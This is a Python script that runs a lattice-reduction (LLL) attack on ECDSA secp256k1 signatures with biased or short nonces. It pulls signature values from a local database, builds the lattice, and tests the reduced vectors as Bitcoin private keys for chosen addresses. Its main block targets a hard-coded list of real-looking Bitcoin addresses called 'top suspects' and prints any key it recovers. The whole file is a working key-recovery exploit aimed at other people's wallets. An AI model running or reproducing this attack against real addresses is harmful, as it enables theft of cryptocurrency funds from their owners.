import sqlite3
import collections
import mpmath
from ecdsa import SECP256k1
from lattice_nonce_analyzer import verify_key
from fast_lll import fast_lll

P = SECP256k1.order
mpmath.mp.prec = 512

def attack_address(address, max_bits=254):
    print(f"\nAttacking {address} with R-bits < {max_bits}")
    
    conn = sqlite3.connect('cryscout.db')
    cur = conn.cursor()
    cur.execute('SELECT r_int, s_int, z_int, r_bits FROM signatures WHERE address = ? AND r_bits < ?', (address, max_bits))
    rows = cur.fetchall()
    conn.close()
    
    if not rows:
        print("  No signatures found.")
        return
        
    sigs = []
    # Use unique (r, s)
    seen = set()
    for r, s, z, bits in rows:
        if (r, s) in seen: continue
        seen.add((r, s))
        sigs.append({
            'u': (pow(int(s), -1, P) * int(z)) % P,
            't': (pow(int(s), -1, P) * int(r)) % P,
            'bits': bits
        })
        
    print(f"  Found {len(sigs)} unique signatures with < {max_bits} bits.")
    
    n = len(sigs)
    if n < 2:
        print("  Not enough signatures.")
        return

    # Matrix Construction for varying MSB leakage
    # We want ki = ui + ti*d - qi*P to be small (< 2^bi)
    # We scale each row i by 2^(256 - bi)
    
    matrix = [[0] * (n + 2) for _ in range(n + 2)]
    for i in range(n):
        scale = 1 << (256 - sigs[i]['bits'])
        matrix[i][i] = P * scale
        matrix[n][i] = sigs[i]['t'] * scale
        matrix[n+1][i] = sigs[i]['u'] * scale
        
    matrix[n][n] = 1
    matrix[n+1][n+1] = 1 << 256 # Scale for d
    
    print(f"  Running LLL on {n+2}x{n+2} matrix...")
    reduced = fast_lll(matrix)
    
    for row in reduced:
        d = abs(int(row[n]))
        if d == 0: continue
        for potential_d in [d, (P - d) % P]:
            if verify_key(potential_d, address):
                print(f"!!! SUCCESS !!! Private key found: {hex(potential_d)}")
                return potential_d
    print("  Failed.")

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        attack_address(sys.argv[1])
    else:
        # Run on top suspects
        targets = ["1FdPpELnjHfwSM4Nvi7LdYS4S4GVGsLUQY", "1PaJvUDUKm3Xr4F88v88v88v88v88v88v8", "13FKHnREotr4jrjiSJwPUpecogVT7Rj7bu", "16HYWQ8HbyZV38m88v88v88v88v88v88v8"]
        for t in targets:
            import sqlite3
            conn = sqlite3.connect('cryscout.db')
            cur = conn.cursor()
            cur.execute("SELECT address FROM signatures WHERE address LIKE ? LIMIT 1", (t[:15] + '%',))
            row = cur.fetchone()
            conn.close()
            if row:
                attack_address(row[0], max_bits=254)
